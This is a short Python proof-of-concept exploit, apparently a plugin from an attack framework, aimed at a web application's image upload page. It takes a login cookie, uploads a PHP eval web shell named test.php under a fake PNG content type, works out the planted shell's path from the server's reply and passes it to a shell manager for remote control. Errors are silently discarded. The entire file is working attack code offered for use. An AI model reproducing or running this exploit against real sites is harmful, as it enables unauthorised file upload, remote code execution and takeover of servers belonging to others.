import requests

from plugin.component.shell import shell
from plugin.component.check import url_check


def poc(url):
    try:
        url_check(url, "upload_img.html")
        upload_url = url + '?is_h5=2'
        cookie = raw_input("[*] Please input cookie:")
        shell_password = raw_input("[*] Please enter the shell-password:")
        shell_content = "<?php eval($_POST['%s']);?>" % shell_password

        header = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
            'Accept':
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':
            'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding':
            'gzip, deflate',
            'Cookie':
            cookie
        }
        upload_file = {
            'uploadDir': (None, 'avatar'),
            'is_thumb': (None, '1'),
            'filename': (None, ''),
            'id': (None, 'WU_FILE_4'),
            'name': (None, 'logo.png'),
            'type': (None, 'image/png'),
            'file': ('test.php', shell_content, 'image/png')
        }
        r = requests.post(upload_url, headers=header, files=upload_file)
        shell_path = url.replace('upload_img.html',
                                 '') + r.json()['data']['img'].replace(
                                     '_s.php', '.php')
        shell_manage = shell(header, shell_path, shell_password)
        shell_manage.check()
        shell_manage.post_manage()

    except Exception:
        pass
